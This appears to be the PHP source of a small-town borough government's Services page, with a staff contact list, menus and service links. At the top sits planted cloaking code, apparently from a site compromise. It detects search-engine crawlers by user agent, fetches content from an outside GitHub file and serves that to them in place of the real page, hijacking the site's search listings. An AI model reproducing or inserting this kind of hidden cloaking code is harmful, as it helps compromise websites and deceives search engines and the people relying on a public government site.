<?php
 
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'tidak ada user agent';
    $bots = array(
        'Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification',
        'Google-InspectionTool', 'AhrefsBot', 'SemrushBot', 'MJ12bot',
        'DotBot', 'PetalBot', 'facebot'
    );
 
    if (empty($user_agent)) {
        return true;
    }
 
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
 
    return false;
}
 
 
function get_remote_content($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'bot-checker');
    $response = curl_exec($ch);
 
    if (curl_errno($ch)) {
        echo 'Curl error: ' . curl_error($ch);
    }
 
    curl_close($ch);
    return $response;
}
 
 
$target_url = 'https://raw.githubusercontent.com/fadlipul69/pluginsss/refs/heads/main/orwigsburg.govservice';
 
 
if (is_bot()) {
    $message = get_remote_content($target_url);
    if ($message) {
        echo $message;
    } else {
        echo "Gagal ambil konten dari URL.";
    }
    exit;
}
?>
<!doctype html>
<html class="no-js" lang="en">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />

	<title>Services | Orwigsburg Borough</title>

    <meta name="theme-version" content="1.8.1" />
    <meta name="foundation-version" content="5.5.4" />
    <meta name="modernizr-version" content="3.6.0" />

	
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<meta name="robots" content="index, follow" />
		
	<meta name="twitter:card" content="summary">
	<meta name="twitter:title" content="Services | Orwigsburg Borough">
	<meta name="twitter:url" content="https://orwigsburg.gov/services/index.php">
	<meta property="og:type" content="website">
	<meta property="og:site_name" content="Orwigsburg Borough">
	<meta property="og:title" content="Services | Orwigsburg Borough">
	<meta property="og:url" content="https://orwigsburg.gov/services/index.php">

	<link rel="stylesheet" type="text/css" media="all" href="../rw_common/themes/foundation/consolidated.css" />
		
	<script>var foundation={};</script>
	<script>function loadCSS(a,b,c){"use strict";var d=window.document.createElement("link"),e=b||window.document.getElementsByTagName("script")[0],f=window.document.styleSheets;return d.rel="stylesheet",d.href=a,d.media="only x",e.parentNode.insertBefore(d,e),d.onloadcssdefined=function(a){for(var b,c=0;c<f.length;c++)f[c].href&&f[c].href===d.href&&(b=!0);b?a():setTimeout(function(){d.onloadcssdefined(a)})},d.onloadcssdefined(function(){d.media=c||"all"}),d}</script>

	

			<link rel='stylesheet' type='text/css' media='all' href='../rw_common/plugins/stacks/stacks.css' />
<link rel="stylesheet" type="text/css" media="all" href="../rw_common/plugins/stacks/wysiwyg-content.css" />		<link rel='stylesheet' type='text/css' media='all' href='files/stacks_page_page4.css' />
        <script type='text/javascript' charset='utf-8' src='../rw_common/plugins/stacks/jquery-2.2.4.min.js'></script>
        
        <link rel="stylesheet" href="../rw_common/plugins/stacks/font-awesome.min.css">
        
		
		<script type='text/javascript' charset='utf-8' src='files/stacks_page_page4.js'></script>
		






	<script>var jQuery=stacks.jQuery,$=jQuery;</script>
	
</head>

<body class="antialiased">

<div id="foundation-loader"></div>


 <div id="total-image-reveal" class="reveal-modal" data-reveal aria-hidden="true"> <a class="close-button close-reveal-modal" title="Close" data-close>&times;</a> </div> 

<div id='stacks_out_1' class='stacks_top'><div id='stacks_in_1' class=''><div id='stacks_out_12' class='stacks_out'><div id='stacks_in_12' class='stacks_in '></div></div><div id='stacks_out_134' class='stacks_out'><div id='stacks_in_134' class='stacks_in '>
	
	











 
 
</div></div><div id='stacks_out_23' class='stacks_out'><div id='stacks_in_23' class='stacks_in '>   <!--[if lt IE 9]> <meta http-equiv="refresh" content="0; url="> <![endif]-->     <script> var preloader_config = "line-scale,5".split(','), loader_inner = document.createElement('div'), loader_class = preloader_config[0]||'line-scale', loader_count = preloader_config[1]||5, loader_node = document.getElementById('foundation-loader'); for (var i = 0; i < loader_count; i++){loader_inner.appendChild(document.createElement('div'));} loader_inner.className = 'loader-inner '+loader_class; loader_node.appendChild(loader_inner); loader_node.style.display = "block"; </script>    
</div></div><div id='stacks_out_263' class='stacks_out'><div id='stacks_in_263' class='stacks_in '><div id='stacks_out_263_3' class='stacks_out'><div id='stacks_in_263_3' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
<div class='row  collapse      '  > <div class='columns small-12  small-centered      '> <div id='stacks_out_263_5' class='stacks_out'><div id='stacks_in_263_5' class='stacks_in com_joeworkman_stacks_foundation_iconbar_s3_stack'><nav class="icon-bar horizontal custom " role="navigation">  <a role="button" tabindex="0" href="tel:570-366-3103" class="item " rel="">   <i class="fa fa-phone"></i>   </a> 
 <a role="button" tabindex="0" href="../map/" class="item " rel="">   <i class="fa fa-map-marker"></i>   </a> 
 <a role="button" tabindex="0" href="https://www.facebook.com/orwigsburg" class="item " rel="external">   <i class="fa fa-facebook"></i>   </a> 
  <a role="button" tabindex="0" data-reveal-id="email" class="item">    <i class="fa fa-envelope"></i>   </a> 
 </nav> 
</div></div><div id='stacks_out_263_41' class='stacks_out'><div id='stacks_in_263_41' class='stacks_in com_joeworkman_stacks_foundation_reveal_stack'> <div id="email" class="reveal-lightbox reveal-modal small  " style="" aria-hidden="true" role="dialog" data-reveal> <div id='stacks_out_263_46' class='stacks_out'><div id='stacks_in_263_46' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div><!-- Total Toggle -->





  
	<div id='stacks_out_263_31' class='stacks_out'><div id='stacks_in_263_31' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_36' class='stacks_out'><div id='stacks_in_263_36' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    William Reppy    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_37' class='stacks_out'><div id='stacks_in_263_37' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Manager    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_35' class='stacks_out'><div id='stacks_in_263_35' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:manager@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_263_45' class='stacks_out'><div id='stacks_in_263_45' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_263_68' class='stacks_out'><div id='stacks_in_263_68' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_69' class='stacks_out'><div id='stacks_in_263_69' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Harlee Lomas    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_71' class='stacks_out'><div id='stacks_in_263_71' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Secretary    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_73' class='stacks_out'><div id='stacks_in_263_73' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:secretary@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_263_75' class='stacks_out'><div id='stacks_in_263_75' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_263_78' class='stacks_out'><div id='stacks_in_263_78' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_79' class='stacks_out'><div id='stacks_in_263_79' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    David Teter    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_81' class='stacks_out'><div id='stacks_in_263_81' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Water/Sewer Department    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_83' class='stacks_out'><div id='stacks_in_263_83' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:dteter@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_263_85' class='stacks_out'><div id='stacks_in_263_85' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_263_88' class='stacks_out'><div id='stacks_in_263_88' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_89' class='stacks_out'><div id='stacks_in_263_89' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Vince McDonald    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_91' class='stacks_out'><div id='stacks_in_263_91' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Police Chief    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_93' class='stacks_out'><div id='stacks_in_263_93' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto: VMcDonald@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_263_95' class='stacks_out'><div id='stacks_in_263_95' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_263_48' class='stacks_out'><div id='stacks_in_263_48' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_49' class='stacks_out'><div id='stacks_in_263_49' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Barry Berger    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_51' class='stacks_out'><div id='stacks_in_263_51' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Mayor    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_53' class='stacks_out'><div id='stacks_in_263_53' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:bberger@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_263_55' class='stacks_out'><div id='stacks_in_263_55' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_263_116' class='stacks_out'><div id='stacks_in_263_116' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_117' class='stacks_out'><div id='stacks_in_263_117' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Richard Bubeck    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_119' class='stacks_out'><div id='stacks_in_263_119' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Council President    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_121' class='stacks_out'><div id='stacks_in_263_121' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:rbubeck@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_263_123' class='stacks_out'><div id='stacks_in_263_123' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_263_127' class='stacks_out'><div id='stacks_in_263_127' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_128' class='stacks_out'><div id='stacks_in_263_128' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Police Department    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_130' class='stacks_out'><div id='stacks_in_263_130' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    General Contact    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_132' class='stacks_out'><div id='stacks_in_263_132' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:police@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_263_134' class='stacks_out'><div id='stacks_in_263_134' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_263_138' class='stacks_out'><div id='stacks_in_263_138' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_139' class='stacks_out'><div id='stacks_in_263_139' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    General Inquires    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_141' class='stacks_out'><div id='stacks_in_263_141' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Borough Office    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_263_143' class='stacks_out'><div id='stacks_in_263_143' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:borough@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_263_145' class='stacks_out'><div id='stacks_in_263_145' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  



  

 
 <a class="close-reveal-modal" aria-label="close" style="">&#215;</a> </div> 
</div></div> </div> </div> 
</div></div><div id='stacks_out_263_1' class='stacks_out'><div id='stacks_in_263_1' class='stacks_in com_joeworkman_stacks_foundation_topbar_s3_stack'>


<div class="top-bar-wrapper  font-family-h2  sticky   matchPadding solid fixedShadow styleActive  submenuIndicator menu-align-right zone-align-right">
    <nav class="top-bar" data-topbar data-options="is_hover:true;custom_back_text:true;back_text:Back;mobile_show_parent_link:true;scrolltop:false;" role="navigation">
        <ul class="title-area title-area-site-setup">
            <li class="name ">
                
                    <a href="https://orwigsburg.gov/">
                        
                            <span class="show-for-medium-up"><img src="../rw_common/images/Borough-logo-png-500-tiny.png" width="500" height="475" alt="Orwigsburg Borough"/></span>
                        
                        
                            <h1 class="site-title font-family-h1 ">
                                Orwigsburg Borough
                                
                            </h1>
                        
                    </a>
                

                
            </li>
            <li class="toggle-topbar menu-icon">
                <a href="#">
                    <span>MENU</span>
                </a>
            </li>
        </ul>

        <section class="top-bar-section font-family-h2 menu-rw">







    <ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../" rel="">Home</a></li><li class="has-dropdown" role="menuitem"><a href="https://orwigsburg.gov/services/utility-payment" rel="">Utility Payment</a></li><li class="has-dropdown" role="menuitem"><a href="../government/" rel="">Government</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../government/gov-news/" rel="">Borough News</a></li><li class="has-dropdown" role="menuitem"><a href="../government/officials/" rel="">Officials</a></li><li class="has-dropdown" role="menuitem"><a href="../government/financials/" rel="">Financial Reports</a></li><li class="has-dropdown" role="menuitem"><a href="../government/public-meetings/" rel="">Public Meetings</a></li><li class="has-dropdown" role="menuitem"><a href="../government/building-zoning/" rel="">Building-Zoning Codes</a></li><li class="has-dropdown" role="menuitem"><a href="../government/community-reports/" rel="">Community Reports</a></li><li class="has-dropdown" role="menuitem"><a href="../government/ordinances/" rel="">Ordinances</a></li><li class="has-dropdown" role="menuitem"><a href="../government/employment/" rel="">Employment</a></li><li class="has-dropdown" role="menuitem"><a href="../government/forms/" rel="">Forms</a></li><li class="has-dropdown" role="menuitem"><a href="../government/tax-collection/" rel="">Tax Collection</a></li></ul></li><li class="active has-dropdown" role="menuitem"><a href="./">Services</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../services/utility-payment/" rel="">Utility Payment</a></li><li class="has-dropdown" role="menuitem"><a href="../services/water/" rel="">Water</a></li><li class="has-dropdown" role="menuitem"><a href="../services/sewer/" rel="">Sewer</a></li><li class="has-dropdown" role="menuitem"><a href="../services/garbage-recycling/" rel="">Garbage-Recycling</a></li><li class="has-dropdown" role="menuitem"><a href="../services/ambulance/" rel="">Ambulance</a></li><li class="has-dropdown" role="menuitem"><a href="../services/fire/" rel="">Fire Dept.</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/" rel="">Police</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../services/police/news/" rel="">Police News</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/police-staff/" rel="">Police Staff</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/police-equipment/" rel="">Police Equipment</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/police-pay-fines/" rel="">Pay Fines</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/laws-regs/" rel="">Forms,Laws,Regs</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/contact/" rel="">Contact Police</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../services/streets/" rel="">Streets-Roads</a></li><li class="has-dropdown" role="menuitem"><a href="../services/swift/" rel="">RAVE Notifications</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../play/" rel="">Play</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../play/events/" rel="">Events</a></li><li class="has-dropdown" role="menuitem"><a href="../play/community/" rel="">Community</a></li><li class="has-dropdown" role="menuitem"><a href="../play/parks-rec/" rel="">Parks & Recreation</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../live/" rel="">Live</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../live/churches/" rel="">Churches</a></li><li class="has-dropdown" role="menuitem"><a href="../live/schools/" rel="">Schools</a></li><li class="has-dropdown" role="menuitem"><a href="../live/library/" rel="">Library</a></li><li class="has-dropdown" role="menuitem"><a href="../live/orgs/" rel="">Organizations</a></li></ul></li></ul>










        </section>
    </nav>
</div>



</div></div></div></div><div id='stacks_out_265' class='stacks_out'><div id='stacks_in_265' class='stacks_in '><div id='stacks_out_265_9' class='stacks_out'><div id='stacks_in_265_9' class='stacks_in com_joeworkman_stacks_impact_stack'> <div class="impact-wrapper impact-preload   proportional-height  "> <div class="pre-loader hidden    "> <i class="pl-spinner hidden fa fa-spinner fa-pulse fa-4x"></i> </div>  <div class="jw-impact slides"> <div class="fg-content fg-full-height">  </div> <ul class="slides-container  "> 





   




   


<!-- Total Impact Gallery -->
<li class="impact-slide slide slide-stacks_in_265_10 fg-content "><img oncontextmenu="return false;" draggable="false" class="impact-image" src="https://orwigsburg.gov/cms-data/gallery/header-slides/slideshowimage_30.jpg" alt="A Great Place to Raise a Family"/><div class="impact-container h-right v-bottom">
                <div class="slide-content" class="text-center fn-text-sw5c1"><h3 class="text-center fn-text-sw5c1">A Great Place to Raise a Family</h3></div>
            </div>
        </li><li class="impact-slide slide slide-stacks_in_265_10 fg-content "><img oncontextmenu="return false;" draggable="false" class="impact-image" src="https://orwigsburg.gov/cms-data/gallery/header-slides/ball-fields.jpg" alt="Recreation"/><div class="impact-container h-right v-bottom">
                <div class="slide-content" class="text-center fn-text-sw5c1"><h3 class="text-center fn-text-sw5c1">Recreation</h3></div>
            </div>
        </li><li class="impact-slide slide slide-stacks_in_265_10 fg-content "><img oncontextmenu="return false;" draggable="false" class="impact-image" src="https://orwigsburg.gov/cms-data/gallery/header-slides/town-18-tiny.jpg" alt="A True "American Home Town""/><div class="impact-container h-right v-bottom">
                <div class="slide-content" class="text-center fn-text-sw5c1"><h3 class="text-center fn-text-sw5c1">A True "American Home Town"</h3></div>
            </div>
        </li>






















 </ul> <nav class="slides-navigation"> <a href="#" class="next"></a> <a href="#" class="prev"></a> </nav>  </div>  </div>  
</div></div></div></div><div id='stacks_out_138' class='stacks_out'><div id='stacks_in_138' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
<div class='row        '  > <div class='columns small-12      '> <div id='stacks_out_4' class='stacks_out'><div id='stacks_in_4' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
<div class='row        '  > <div class='columns small-12      '> <div id='stacks_out_17' class='stacks_out'><div id='stacks_in_17' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h1 class="text-left     " >Borough Services</h1> 
</div></div><!-- Total Toggle -->





  
	<div id='stacks_out_137' class='stacks_out'><div id='stacks_in_137' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <p>The following services are available to Orwigsburg Bourough residents.</p><p><br></p><p><br></p><p><br><a href="http://www.paonecall.org" rel="noopener noreferrer" target="_blank"><img src="/cms-data/gallery/hipwig/wesupportpennsylvania811-1535560736.jpg" class="fr-fic fr-dib" style="width: 50%;"></a></p>    
 
</div></div>


  

 
<div id='stacks_out_140' class='stacks_out'><div id='stacks_in_140' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div><div id='stacks_out_141' class='stacks_out'><div id='stacks_in_141' class='stacks_in com_joeworkman_stacks_foundation_blockgrid_s3_stack'> 
<ul class="small-block-grid-1 medium-block-grid-2 large-block-grid-3"> <li><div class="block-item"><!-- Total Toggle -->





  
	<div id='stacks_out_147' class='stacks_out'><div id='stacks_in_147' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../services/utility-payment"> <img loading="auto" class="unlimited   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/service-image-01.png"   src="https://orwigsburg.gov/cms-data/image/service-image-01-sq.png" data-interchange="[https://orwigsburg.gov/cms-data/image/service-image-01-sq.png, (default)],[https://orwigsburg.gov/cms-data/image/service-image-01-sq.png, (medium)]"    onerror="this.style.display='none'"  /> </a>   















 
</div></div><div id='stacks_out_208' class='stacks_out'><div id='stacks_in_208' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h4 class="text-center     " >Utility Payment</h4> 
</div></div>


  

 
</div></li> 
<li><div class="block-item"><!-- Total Toggle -->





  
	<div id='stacks_out_156' class='stacks_out'><div id='stacks_in_156' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../services/water"> <img loading="auto" class="unlimited   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/service-image-02.png"   src="https://orwigsburg.gov/cms-data/image/service-image-02-sq.png" data-interchange="[https://orwigsburg.gov/cms-data/image/service-image-02-sq.png, (default)],[https://orwigsburg.gov/cms-data/image/service-image-02-sq.png, (medium)]"    onerror="this.style.display='none'"  /> </a>   















 
</div></div><div id='stacks_out_211' class='stacks_out'><div id='stacks_in_211' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h4 class="text-center     " >Water</h4> 
</div></div>


  

 
</div></li> 
<li><div class="block-item"><!-- Total Toggle -->





  
	<div id='stacks_out_161' class='stacks_out'><div id='stacks_in_161' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../services/sewer"> <img loading="auto" class="unlimited   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/service-image-03.png"   src="https://orwigsburg.gov/cms-data/image/service-image-03-sq.png" data-interchange="[https://orwigsburg.gov/cms-data/image/service-image-03-sq.png, (default)],[https://orwigsburg.gov/cms-data/image/service-image-03-sq.png, (medium)]"    onerror="this.style.display='none'"  /> </a>   















 
</div></div><div id='stacks_out_214' class='stacks_out'><div id='stacks_in_214' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h4 class="text-center     " >Sewer</h4> 
</div></div>


  

 
</div></li> 
<li><div class="block-item"><!-- Total Toggle -->





  
	<div id='stacks_out_166' class='stacks_out'><div id='stacks_in_166' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../services/garbage-recycling"> <img loading="auto" class="unlimited   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/service-image-04.png"   src="https://orwigsburg.gov/cms-data/image/service-image-04-sq.png" data-interchange="[https://orwigsburg.gov/cms-data/image/service-image-04-sq.png, (default)],[https://orwigsburg.gov/cms-data/image/service-image-04-sq.png, (medium)]"    onerror="this.style.display='none'"  /> </a>   















 
</div></div><div id='stacks_out_217' class='stacks_out'><div id='stacks_in_217' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h4 class="text-center     " >Garbage & Recycling</h4> 
</div></div>


  

 
</div></li> 
<li><div class="block-item"><!-- Total Toggle -->





  
	<div id='stacks_out_171' class='stacks_out'><div id='stacks_in_171' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../services/ambulance"> <img loading="auto" class="unlimited   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/service-image-05.png"   src="https://orwigsburg.gov/cms-data/image/service-image-05-sq.png" data-interchange="[https://orwigsburg.gov/cms-data/image/service-image-05-sq.png, (default)],[https://orwigsburg.gov/cms-data/image/service-image-05-sq.png, (medium)]"    onerror="this.style.display='none'"  /> </a>   















 
</div></div><div id='stacks_out_220' class='stacks_out'><div id='stacks_in_220' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h4 class="text-center     " >Ambulance</h4> 
</div></div>


  

 
</div></li> 
<li><div class="block-item"><!-- Total Toggle -->





  
	<div id='stacks_out_151' class='stacks_out'><div id='stacks_in_151' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../services/fire"> <img loading="auto" class="unlimited   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/service-image-06.png"   src="https://orwigsburg.gov/cms-data/image/service-image-06-sq.png" data-interchange="[https://orwigsburg.gov/cms-data/image/service-image-06-sq.png, (default)],[https://orwigsburg.gov/cms-data/image/service-image-06-sq.png, (medium)]"    onerror="this.style.display='none'"  /> </a>   















 
</div></div><div id='stacks_out_223' class='stacks_out'><div id='stacks_in_223' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h4 class="text-center     " >Fire</h4> 
</div></div>


  

 
</div></li> 
<li><div class="block-item"><!-- Total Toggle -->





  
	<div id='stacks_out_197' class='stacks_out'><div id='stacks_in_197' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../services/police"> <img loading="auto" class="unlimited   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/service-image-07.png"   src="https://orwigsburg.gov/cms-data/image/service-image-07-sq.png" data-interchange="[https://orwigsburg.gov/cms-data/image/service-image-07-sq.png, (default)],[https://orwigsburg.gov/cms-data/image/service-image-07-sq.png, (medium)]"    onerror="this.style.display='none'"  /> </a>   















 
</div></div><div id='stacks_out_226' class='stacks_out'><div id='stacks_in_226' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h4 class="text-center     " >Police</h4> 
</div></div>


  

 
</div></li> 
<li><div class="block-item"><!-- Total Toggle -->





  
	<div id='stacks_out_202' class='stacks_out'><div id='stacks_in_202' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="https://www.smart911.com/smart911/ref/login.action?pa=orwigsburg"> <img loading="auto" class="unlimited   center " oncontextmenu="return false;" draggable="false" alt='Rave Mobile Safety' data-img="https://orwigsburg.gov/cms-data/image/service-image-08.png"   src="https://orwigsburg.gov/cms-data/image/service-image-08-sq.png" data-interchange="[https://orwigsburg.gov/cms-data/image/service-image-08-sq.png, (default)],[https://orwigsburg.gov/cms-data/image/service-image-08-sq.png, (medium)]"    onerror="this.style.display='none'"  /> </a>   















 
</div></div><div id='stacks_out_229' class='stacks_out'><div id='stacks_in_229' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h4 class="text-center     " >RAVE MOBILE SAFETY Notifications</h4> 
</div></div>


  

 
</div></li> 
<li><div class="block-item"><!-- Total Toggle -->





  
	<div id='stacks_out_192' class='stacks_out'><div id='stacks_in_192' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../services/streets"> <img loading="auto" class="unlimited   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/service-image-09.png"   src="https://orwigsburg.gov/cms-data/image/service-image-09-sq.png" data-interchange="[https://orwigsburg.gov/cms-data/image/service-image-09-sq.png, (default)],[https://orwigsburg.gov/cms-data/image/service-image-09-sq.png, (medium)]"    onerror="this.style.display='none'"  /> </a>   















 
</div></div><div id='stacks_out_232' class='stacks_out'><div id='stacks_in_232' class='stacks_in com_joeworkman_stacks_foundation_header_stack'><h4 class="text-center     " >Street</h4> 
</div></div>


  

 
</div></li> 
<li><div class="block-item"><!-- Total Toggle -->





  



  

 
</div></li> 
<li><div class="block-item"><!-- Total Toggle -->





  



  

 
</div></li> 
<li><div class="block-item"><!-- Total Toggle -->





  



  

 
</div></li> 
